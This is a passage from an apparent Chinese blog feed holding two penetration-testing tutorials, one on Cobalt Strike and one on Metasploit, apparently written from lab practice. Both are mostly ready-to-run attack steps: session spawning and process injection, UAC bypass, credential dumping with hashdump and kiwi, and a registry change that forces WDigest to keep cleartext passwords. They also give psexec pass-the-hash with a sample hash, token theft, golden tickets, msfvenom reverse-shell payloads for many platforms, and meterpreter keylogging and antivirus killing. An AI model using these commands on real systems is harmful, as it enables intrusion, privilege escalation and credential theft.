src="/2022/04/17/day44/image-20220516165252162.png" alt="image-20220516165252162"></p><p>经过一会，可看到又获得了一个会话，进程为rundll32.exe，并且在会话交互中也可看到该操作的命令执行。</p><pre class="line-numbers language-none"><code class="language-none">spawn 监听器名称<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/04/17/day44/image-20220516165352345.png" alt="image-20220516165352345"></p><h3 id="注入进程获取会话"><a href="#注入进程获取会话" class="headerlink" title="注入进程获取会话"></a>注入进程获取会话</h3><p>右键-&gt;expore-&gt;process list，查看进程列表</p><p><img src="/2022/04/17/day44/image-20220516165708931.png" alt="image-20220516165708931"></p><p>我们本来的会话是administrator权限，我们可以选择一个system权限的进程注入进去，这样就可以获得一个system权限的会话</p><p>点击注入之后，选择监听器</p><p><img src="/2022/04/17/day44/image-20220516165842733.png" alt="image-20220516165842733"></p><p>之后再次得到了一个会话，可看到是system权限</p><p><img src="/2022/04/17/day44/image-20220516170227257.png" alt="image-20220516170227257"></p><h3 id="cobalt-strike派生会话到msf"><a href="#cobalt-strike派生会话到msf" class="headerlink" title="cobalt strike派生会话到msf"></a>cobalt strike派生会话到msf</h3><p>我们可以将cs上线的会话派生到msf中</p><p>首先创建新的监听器，监听器类型选择foreign http，设置好ip和端口，</p><p><img src="/2022/04/17/day44/image-20220516170810584.png" alt="image-20220516170810584"></p><p>ip就为cs服务器ip，端口为之后msf回连端口</p><p>打开msf终端，执行以下命令，run之后msf开始监听</p><pre class="line-numbers language-none"><code class="language-none">msfconsoleuse exploit/multi/handlerset payload windows/meterpreter/reverse_httpset lhostset lportrun<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2022/04/17/day44/image-20220516171103936.png" alt="image-20220516171103936"></p><p>右键会话-&gt;spawn-&gt;选择刚才新建的foreign http会话，之后cs就会自动把会话派生到msf</p><p>或者也可以使用beacon命令，可看到msf获取到了meterpreter会话</p><p><img src="/2022/04/17/day44/image-20220516171438299.png" alt="image-20220516171438299"></p><h3 id="msf派生会话到cs"><a href="#msf派生会话到cs" class="headerlink" title="msf派生会话到cs"></a>msf派生会话到cs</h3><p>如果msf获取到了会话，也可通过payload_inject模块将会话派生到cs里面</p><p>在cs里面新建监听器，选择端口为9999</p><p><img src="/2022/04/17/day44/image-20220516171955415.png" alt="image-20220516171955415"></p><p>在msf里面执行如下命令，这里设置参数 disablepayloadhandler为true，用来禁止msf监听，如果不设置我们获取到的会话就是msf本地的</p><pre class="line-numbers language-none"><code class="language-none">use exploit/windows/local/payload_injectset payload windows/meterpreter/reverse_httpset disablepayloadhandler trueset lhost set lportset sessionrun<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2022/04/17/day44/image-20220516172407057.png" alt="image-20220516172407057"></p><p>我运行俩次试试，可看到cs多了俩个会话</p><p><img src="/2022/04/17/day44/image-20220516173311513.png" alt="image-20220516173311513"></p><h2 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h2><h3 id="获取hash"><a href="#获取hash" class="headerlink" title="获取hash"></a>获取hash</h3><p>凭证提权里有个抓取hash，类似于msf的hashdump</p><p><img src="/2022/04/17/day44/image-20220517142441117.png" alt="image-20220517142441117"></p><p>可以看到beacon执行hashdump，抓取到的hahs可以在视图里面的密码凭证里查看</p><p><img src="/2022/04/17/day44/image-20220517142600854.png" alt="image-20220517142600854"></p><p>抓取到的hash</p><p><img src="/2022/04/17/day44/image-20220517142631444.png" alt="image-20220517142631444"></p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><blockquote><p>ms14-058/ms15-051/ms16-016/ms16-032</p><p>这些都是大家耳熟能详的Windows本地提权漏洞，在此插件中都已经集成</p><p>UAC-DLL</p><p>这是一种绕过UAC的攻击，它试图将本地管理员运行的有效负载从低权限提升到高权限。此攻击使用UAC漏洞将ArtifactKit生成的DLL复制到特权位置。此攻击适用于Windows7和Windows8及更高版本的未修补版本。</p><p>uac-token-duplication</p><p>这是另一种绕过UAC的攻击，将其从低权限提升到高权限（作为本地管理员）。这种攻击使用一个UAC漏洞，允许非提升进程使用从提升进程中窃取的令牌启动任意进程。此漏洞要求攻击删除分配给提升令牌的多个权限。此攻击适用于Windows7及更高版本。如果AlwaysNotify处于其最高设置，则此攻击要求提升的进程已在当前桌面会话中运行（作为同一用户）,此漏洞使用PowerShell生成会话。</p><p>Uac-eventvwr</p><p>这种提权方法是利用时间查看器eventvwr，通过注册表之后，执行Eventvwr.exe会自动加载我们的A.exe(exp),这个时候他的权限就是高了，成功绕过UAV</p><p>Uac-wscript</p><p>这种绕过uac提权的方法最初是在Empire框架中现身的，该方法只针对Windows7有效</p></blockquote><p>右键-&gt;凭证提权-&gt;权限提升，cs原本存在俩个提权模块</p><p><img src="/2022/04/17/day44/image-20220517142809091.png" alt="image-20220517142809091"></p><p>原本存在俩个提权模块</p><p><img src="/2022/04/17/day44/image-20220517142903074.png" alt="image-20220517142903074"></p><p>我们可以在cs中添加脚本，使用更多的提权模块。进入scripts，将下载的elevatekit脚本在此处。github下载，modules里面有一些常用的提权exp</p><p><img src="/2022/04/17/day44/image-20220517143940356.png" alt="image-20220517143940356"></p><p>点击cobalt strike-&gt;脚本管理器，</p><p><img src="/2022/04/17/day44/image-20220517143031751.png" alt="image-20220517143031751"></p><p>点击加载-&gt;选择scripts里面的脚本文件-&gt;点击打开</p><p><img src="/2022/04/17/day44/image-20220517144123702.png" alt="image-20220517144123702"></p><p>返回权限提升操作发现成功导入了一些提权模块</p><p><img src="/2022/04/17/day44/image-20220517144244753.png" alt="image-20220517144244753"></p><p>我们尝试baypass uac</p><blockquote><p>uac 用户账户控制，通过弹窗让用户进一步确认是否授权当前可执行文件</p></blockquote><p>通俗的讲，我们在没有*的机器上getsytem无法成功，但是我们在bypass的主机getsystem可以成功。</p><p>假如我们此时上线一个主机，但是没有完全控制权限，此时在这台主机beacon中运行getsystem会失败。并且，我们在没有完全控制权限的主机上传dll文件会失败。</p><p>我们进行提权，选择uac-schtasks提权模块，该模块可以bypass uac，之后我们获取到一个完全控制的会话。</p><p><img src="/2022/04/17/day44/image-20220517145148466.png" alt="image-20220517145148466"></p><p>这时我们在这一个会话上运行getsystem就会成功。</p><h3 id="抓取明文密码"><a href="#抓取明文密码" class="headerlink" title="抓取明文密码"></a>抓取明文密码</h3><p>右键-&gt;凭证提权-&gt;抓取明文密码，或者beacon中输入logonpasswords，需要管理员权限</p><p><img src="/2022/04/17/day44/image-20220517151919951.png" alt="image-20220517151919951"></p><h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><blockquote><p>横向渗透攻击技术是复杂网络攻击中广泛使用的一种技术，特别是在高级持续威胁（AdvancedPersistent Threats，APT）中更加热衷于使用这种攻击方法。攻击者可以利用这些技术，以被攻陷的系统为跳板，访问其他主机，获取包括邮箱、共享文件夹或者凭证信息在内的敏感资源。攻击者可以利用这些敏感信息，进一步控制其他系统、提升权限或窃取更多有价值的凭证。借助此类攻击，攻击者最终可能获取域控的访问权限，完全控制基于Windows系统的基础设施或与业务相关的关键账户。</p></blockquote><h3 id="psexec横移"><a href="#psexec横移" class="headerlink" title="psexec横移"></a>psexec横移</h3><p>右键-&gt;浏览探测-&gt;网络探测，或者beacon中输入net view。</p><p><img src="/2022/04/17/day44/image-20220517153056071.png" alt="image-20220517153056071"></p><p>可以显示出网络中存活的主机，或者点击视图 -&gt;目标列表。</p><p><img src="/2022/04/17/day44/image-20220517153350727.png" alt="image-20220517153350727"></p><p>新建一个smb监听器，</p><p><img src="/2022/04/17/day44/image-20220517153553973.png" alt="image-20220517153553973"></p><p>右键138这台主机，对他进行端口扫描，</p><p><img src="/2022/04/17/day44/image-20220517153501513.png" alt="image-20220517153501513"></p><p>端口只扫描445即可，会话选择139这台主机</p><p><img src="/2022/04/17/day44/image-20220517153828096.png" alt="image-20220517153828096"></p><p>可在beacon看到操作命令和显示信息，目标开放445端口</p><p><img src="/2022/04/17/day44/image-20220517153927349.png" alt="image-20220517153927349"></p><p>这里我们可以使用psexec进行横向移动。</p><p><img src="/2022/04/17/day44/image-20220517154319877.png" alt="image-20220517154319877"></p><p>可以使用hash，选择监听器为smb，会话为139主机，运行之后拿到会话</p><p><img src="/2022/04/17/day44/image-20220517154810640.png" alt="image-20220517154810640"></p><p> 可看到通过横向从139拿到了138的session，如果此时139session断开连接，拿到的138也会断开，因为是通过139拿到的session</p><p><img src="/2022/04/17/day44/image-20220517161838356.png" alt="image-20220517161838356"></p><p>我们也可以不使用hash，使用jump命令，jump psexec 12server4 beacon-smb，可看到也拿到了session</p><p><img src="/2022/04/17/day44/image-20220517162540713.png" alt="image-20220517162540713"></p><p>上面俩个是通过正向连接的方式，如果目标开启了防火墙，这种方法就会失败。</p><p>我们可以使用反向连接的方法，首先先做一个代理转发-&gt;转发上线</p><p><img src="/2022/04/17/day44/image-20220517164619245.png" alt="image-20220517164619245"></p><p>之后使用jump命令，jump psexec 12server4 reverse，可看到又获得了一个session会话</p><p><img src="/2022/04/17/day44/image-20220517164818116.png" alt="image-20220517164818116"></p><h3 id="窃取令牌"><a href="#窃取令牌" class="headerlink" title="窃取令牌"></a>窃取令牌</h3><p>可以使用ps列出进程</p><p><img src="/2022/04/17/day44/image-20220517170417315.png" alt="image-20220517170417315"></p><p>使用steal_token pid，来窃取进程令牌，比如现在是adminnistrator权限，我们可以通过窃取进程令牌拿到system权限。通过rev2self来返回之前的令牌。</p><h3 id="制作令牌"><a href="#制作令牌" class="headerlink" title="制作令牌"></a>制作令牌</h3><p>右键-&gt;凭证提权-&gt;创建令牌，输入用户名密码和域名来创建令牌</p><p><img src="/2022/04/17/day44/image-20220517171141758.png" alt="image-20220517171141758"></p><p><img src="/2022/04/17/day44/image-20220517171047945.png" alt="image-20220517171047945"></p><p>我这里创建的是域管理员的账号密码，我尝试拿域管的会话，可以看到成功了。(注：之前作得代理转发还在，所以我用的反向连接)，可看到上方拿到了136主机的会话。</p><p><img src="/2022/04/17/day44/image-20220517171340578.png" alt="image-20220517171340578"></p><h3 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h3><p>我们进入域控的会话交互，黄金票据的原理这里就不细说了，直接来做</p><p>使用hashdump拿到krbtgt的ntlmhash，可在视图中的密码凭证看到拿到的hash</p><p><img src="/2022/04/17/day44/image-20220517171909901.png" alt="image-20220517171909901"></p><p>使用shell whoami /user，拿到域的SID值，最后一个-前面是域的sid值，后面的500是用户的sid值，我们需要的是前面部分。</p><p><img src="/2022/04/17/day44/image-20220517172208376.png" alt="image-20220517172208376"></p><p>右键-&gt;凭证提权-&gt;黄金票据</p><p><img src="/2022/04/17/day44/image-20220517172326928.png" alt="image-20220517172326928"></p><p>填写对应信息，点击生成</p><p><img src="/2022/04/17/day44/image-20220517172500548.png" alt="image-20220517172500548"></p><p>下图可看到成功了，我们尝试dir域控目录也成功。</p><p><img src="/2022/04/17/day44/image-20220517172615415.png" alt="image-20220517172615415"></p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cobalt strile </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>meta sploit</title>
      <link href="/2022/04/05/day43/"/>
      <url>/2022/04/05/day43/</url>
      
        <content type="html"><![CDATA[<h1 id="msf内网"><a href="#msf内网" class="headerlink" title="msf内网"></a>msf内网</h1><span id="more"></span><p>metasploit一个漏洞框架，允许开发自己的漏洞脚本测试</p><h2 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h2><h3 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h3><pre class="line-numbers language-none"><code class="language-none">msfconsole<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="术语"><a href="#术语" class="headerlink" title="术语"></a>术语</h3><pre class="line-numbers language-none"><code class="language-none">– Exploit，攻击工具/代码 – Payload，攻击载荷 – Shellcode，一段自主运行的汇编代码，用来利用漏洞。像msf的msfveom或者cs的payload generator可生成shellcode– Module，模块 – Listener，监听器 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><pre class="line-numbers language-none"><code class="language-none">show exploits – 查看所有可用的渗透攻击程序代码show auxiliary – 查看所有可用的辅助攻击工具 show options – 查看该模块所有可用选项 show payloads – 查看该模块适用的所有载荷代码 show targets – 查看该模块适用的攻击目标类型 search – 根据关键字搜索某模块 info – 显示某模块的详细信息 use – 进入使用某渗透攻击模块 back – 回退 set/unset – 设置/禁用模块中的某个参数 setg/unsetg – 设置/禁用适用于所有模块的全局参数 save – 将当前设置值保存下来，以便下次启动MSF终端时仍可使用 Cd 更改当前的工作目录 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="核心命令"><a href="#核心命令" class="headerlink" title="核心命令"></a>核心命令</h3><pre class="line-numbers language-none"><code class="language-none">Sessions – 转储会话列表并显示有关会话的信息 Color – 切换颜色 Connect – 连接与主机通信 exit – 退出控制台 quit – 退出控制台 sleep – 在指定的秒数内不做任何事情 get – 获取特定于上下文的变量的值 getg – 获取全局变量的值 spool – 将控制台输出写入文件以及屏幕 threads – 线程查看和操作后台线程 grep  – 另一个命令的输出 unload – 卸载框架插件 load – 加载一个框架插件 history – 显示命令历史 irb – 进入irb脚本模式 version – 显示框架和控制台库版本号 route – 通过会话路由流量 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="建立搜索缓存数据库"><a href="#建立搜索缓存数据库" class="headerlink" title="建立搜索缓存数据库"></a>建立搜索缓存数据库</h3><p>kali终端中执行</p><pre class="line-numbers language-none"><code class="language-none">service postgresql start  - 启动postgresql数据库，监听5432msfdb init  - 初始化metaspolit数据库msfconsole db_status  - 查看数据库连接情况msfconsole db_rebuild_cache  - 建立数据库缓存<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="数据库后端命令"><a href="#数据库后端命令" class="headerlink" title="数据库后端命令"></a>数据库后端命令</h3><pre class="line-numbers language-none"><code class="language-none">analyze – 分析有关特定地址或地址范围的数据库信息 db_connect – 连接到现有数据服务 db_disconnect – 断开与当前数据服务的连接 db_export – 导出包含数据库内容的文件 db_import – 导入扫描结果文件（将自动检测文件类型） db_nmap – 执行nmap并自动记录输出 db_rebuild_cache – 重建数据库存储的模块高速缓存 db_remove – 删除已保存的数据服务条目 db_save – 将当前数据服务连接保存为启动时重新连接的默认值 db_status – 显示当前数据服务状态 hosts – 列出数据库中的所有主机 loot – 列出数据库中的所有战利品 notes – 列出数据库中的所有注释 services – 列出数据库中的所有服务 vulns – 列出数据库中的所有漏洞 workspace – 在数据库工作区之间切换凭据后端命令 creds – 列出数据库中的所有凭据 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="模块命令"><a href="#模块命令" class="headerlink" title="模块命令"></a>模块命令</h3><pre class="line-numbers language-none"><code class="language-none">Advanced – 显示一个或多个模块的高级选项Back – 从当前上下文返回 Edit – 使用首选编辑器编辑当前模块 info – 显示有关一个或多个模块的信息 loadpath – 路径从路径搜索并加载模块 options – 显示全局选项或一个或多个模块 popm – 将最新的模块从堆栈中弹出并使其处于活动状态 previous – 将之前加载的模块设置为当前模块 pushm – 将活动或模块列表推入模块堆栈 reload_all – 从所有定义的模块路径重新加载所有模块 search – 搜索模块名称和描述 show – 显示给定类型的模块或所有模块 use – 按名称选择模块 enumdesktops #查看可用的桌面 getdesktop #获取当前meterpreter 关联的桌面 setdesktop #设置meterpreter关联的桌面 -h查看帮助 screenshot #截屏 run vnc #使用vnc远程桌面连接 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="msf功能程序"><a href="#msf功能程序" class="headerlink" title="msf功能程序"></a>msf功能程序</h2><p>msfvenom （攻击载荷生成和编码器）</p><pre class="line-numbers language-none"><code class="language-none">主要参数：-p payload-e 编码方式-i 编码次数-b 在生成的程序中避免出现的值 LHOST,LPORT 监听上线的主机IP和端口-f exe 生成EXE格式使用msfvenom -l 可以查看可以利用payloadmsfvenom -l| grep windows | grep x64| grep tcp 选择payload<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="一些例子"><a href="#一些例子" class="headerlink" title="一些例子"></a>一些例子</h3><pre class="line-numbers language-none"><code class="language-none">Linux: msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf Windows: msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe Mac: msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho PHP: msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php cat shell.php | pbcopy &amp;&amp; echo '&lt;?php ' | tr -d '\n' &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php ASP: msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp JSP: msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp WAR: msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war Python: msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py Bash:msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh Perl: msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这些是反向连接的shell，msf也有正向连接的 windows/x64/meterpreter/bind_tcp</p><h3 id="监听"><a href="#监听" class="headerlink" title="监听"></a>监听</h3><pre class="line-numbers language-none"><code class="language-none">use exploit/multi/handlerset payload  &lt;Payload name&gt;show options 查看参数set &lt;参数&gt; &lt;参数值&gt;exploit -j –z -j(作为job开始运行，强制运行在前台，即使是被动的)和-z(不立即进行session交互--也即是自动后台运行)set PrependMigrate true – 自动迁移进程<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>也可在启动时监听</p><pre class="line-numbers language-none"><code class="language-none">msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_http; set lhost 127.0.0.1; set lport 1234; exploit - j; " <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="meterpreter后渗透攻击"><a href="#meterpreter后渗透攻击" class="headerlink" title="meterpreter后渗透攻击"></a>meterpreter后渗透攻击</h2><p>Meterpreter提供的功能包括反追踪、纯内存工作模式、系统信息获取、密码哈希导出、文件上传载、屏幕截取、键盘记 录、权限提升、跳板攻击等等。</p><h3 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h3><pre class="line-numbers language-none"><code class="language-none">meterpreter &gt; background 放回后台 meterpreter &gt; exit 关闭会话 meterpreter &gt; help 帮助信息 meterpreter &gt; Sysinfo 系统平台信息 meterpreter &gt; screenshot 屏幕截取 meterpreter &gt; shell 命令行shell (exit退出) meterpreter &gt; getlwd 查看本地目录 meterpreter &gt; lcd 切换本地目录 meterpreter &gt; getwd 查看目录 meterpreter &gt; ls 查看文件目录列表 meterpreter &gt; cd 切换目录 meterpreter &gt; rm 删除文件 meterpreter &gt; download C:\\Users\\123\\Desktop\\1.txt 1.txt 下载文件 meterpreter &gt; upload /var/www/wce.exe wce.exe 上传文件meterpreter &gt; search -d c: -f *.doc 搜索文件 meterpreter &gt; execute -f cmd.exe -i 执行程序/命令 meterpreter &gt; ps 查看进程 meterpreter &gt; run post/windows/capture/keylog_recorder 键盘记录 meterpreter &gt; getuid 查看当前用户权限 meterpreter &gt; use priv 加载特权模块 meterpreter &gt; getsystem 提升到SYSTEM权限 meterpreter &gt; hashdump 导出密码散列 meterpreter &gt; ps 查看高权限用户PID meterpreter &gt; steal_token &lt;PID&gt; 窃取令牌 meterpreter &gt; rev2self 恢复原来的令牌 meterpreter &gt; migrate pid 迁移进程 meterpreter &gt; run killav 关闭杀毒软件 meterpreter &gt; run getgui-e 启用远程桌面 meterpreter &gt; portfwd add -l 1234 -p 3389 -r &lt;目标IP&gt; 端口转发 meterpreter &gt; run get_local_subnets 获取内网网段信息 meterpreter &gt; run autoroute -s &lt;内网网段&gt; 创建自动路由 meterpreter &gt; run autoroute -p 查看自动路由表 创建代理通道: msf &gt; use auxiliary/server/socks4a 设置socks4代理模块 msf auxiliary(socks4a) &gt; show options msf auxiliary(socks4a) &gt; run 配置proxychains参数： nano /etc/proxychains.conf 修改代理监听端口,和前面端口一致 quite_mode 设置成安静模式：去掉如下参数前面的注释 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果拿到cmd乱码，是因为Windows命令终端默认活动代码页为：936(ANSI/OEM-简体中文GBK)，与Linux命令终端默认65001(Unicode-UTF-8)编码不一致。</p><pre class="line-numbers language-none"><code class="language-none">chcp 65001<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="获取hash和明文"><a href="#获取hash和明文" class="headerlink" title="获取hash和明文"></a>获取hash和明文</h3><pre class="line-numbers language-none"><code class="language-none">meterpreter &gt; hashdump或meterpreter &gt; run hashdump<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可获取hash</p><p>在最新的版本中load mimikatz已经取消 现在使用kiwi模块</p><pre class="line-numbers language-none"><code class="language-none">creds_all：列举所有凭据 creds_kerberos：列举所有kerberos凭据 creds_msv：列举所有msv凭据 creds_ssp：列举所有ssp凭据 creds_tspkg：列举所有tspkg凭据 creds_wdigest：列举所有wdigest凭据 dcsync：通过DCSync检索用户帐户信息 dcsync_ntlm：通过DCSync检索用户帐户NTLM散列、SID和RID golden_ticket_create：创建黄金票据 kerberos_ticket_list：列举kerberos票据 kerberos_ticket_purge：清除kerberos票据 kerberos_ticket_use：使用kerberos票据 kiwi_cmd：执行mimikatz的命令，后面接mimikatz.exe的命令 lsa_dump_sam：dump出lsa的SAM lsa_dump_secrets：dump出lsa的密文 password_change：修改密码 wifi_list：列出当前用户的wifi配置文件 wifi_list_shared：列出共享wifi配置文件/编码 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Windows201以上，默认禁止在内存缓存中保存明文密码</p><p>修改注册表抓明文</p><pre class="line-numbers language-none"><code class="language-none">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f kiwi_cmd sekurlsa::logonpasswords<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可读到明文和hash</p><p>msf下有psexec的模块，可利用hash进行登录</p><pre class="line-numbers language-none"><code class="language-none">use exploit/windows/smb/psexecset SMBUser administrator set smbpass aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="开启远程终端"><a href="#开启远程终端" class="headerlink" title="开启远程终端"></a>开启远程终端</h3><pre class="line-numbers language-none"><code class="language-none">meterpreter &gt; run getgui -e 开启远程终端<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>执行后会开启目标的3389</p><p>在kali终端下连接</p><pre class="line-numbers language-none"><code class="language-none">rdesktop ip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h3><p>如果服务器开启了防火墙，会拦截远程终端端口。可以使用portfwd将3389转发出来</p><pre class="line-numbers language-none"><code class="language-none">portfwd add -l 1234 -p 3389 -r目标ip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>之后rdesktop连接本地的1234</p><pre class="line-numbers language-none"><code class="language-none">rdesktop 127.0.0.1:1234<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可将转发清楚掉</p><pre class="line-numbers language-none"><code class="language-none">portfw<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="db-nmap-db-autopwn对主机进行自动漏洞攻击"><a href="#db-nmap-db-autopwn对主机进行自动漏洞攻击" class="headerlink" title="db_nmap+db_autopwn对主机进行自动漏洞攻击"></a>db_nmap+db_autopwn对主机进行自动漏洞攻击</h2><p><a href="https://github.com/hahwul/metasploit-autopwn">https://github.com/hahwul/metasploit-autopwn</a></p><p>复制到插件目录</p><pre class="line-numbers language-none"><code class="language-none">cp db_autopwn.rb /opt/metasploit-framework/plugins<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>加载插件</p><pre class="line-numbers language-none"><code class="language-none">load db_autopwn<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用说明</p><blockquote><p>db_autopwn</p><p>使用:db_autopwn [options]</p><p>-h显示帮助文本</p><p>-t显示所有匹配的攻击模块</p><p>-x根据漏洞引用选择模块</p><p>-p根据打开的端口选择模块</p><p>-e发射利用所有匹配的目标</p><p>-r使用反向连接shell</p><p>-b在随机端口上使用绑定shell(默认)</p><p>-q禁用攻击模块输出</p><p>-R [rank]只运行等级最小的模块</p><p>-I [range]仅利用此范围内的主机</p><p>-X [range]总是排除该范围内的主机</p><p>-PI [range]仅利用打开这些端口的主机</p><p>-PX [range]总是排除打开这些端口的主机</p><p>-m [regex]只运行名称匹配regex的模块</p><p>-T [secs]任何攻击的最大运行时间(以秒为单位)</p></blockquote><p>常用命令</p><pre class="line-numbers language-none"><code class="language-none">db_autopwn -t -p -r db_autopwn -p -m exploit/windows/smb/ms17_010_eternalblue -e<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="跨路由访问"><a href="#跨路由访问" class="headerlink" title="跨路由访问"></a>跨路由访问</h2><p>渗透过程中，拿到一个主机与数据库不在同一个网段的主机，可得出此主机连接内网，我们将此web主机当作跳板机渗透内网</p><p>在跳板机拿到一个meterpreter</p><p>获取内网网卡</p><pre class="line-numbers language-none"><code class="language-none">run get_local_subnets <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/04/05/day43/image-20220413124202661.png" alt="image-20220413124202661"></p><p>绑定路由(不绑定路由无法访问目标主机)</p><pre class="line-numbers language-none"><code class="language-none">run autoroute -s 10.10.10.0/24 或者route add 10.10.10.0 255.255.255.0 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>查看路由</p><pre class="line-numbers language-none"><code class="language-none">run autoroute -phroute print <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img 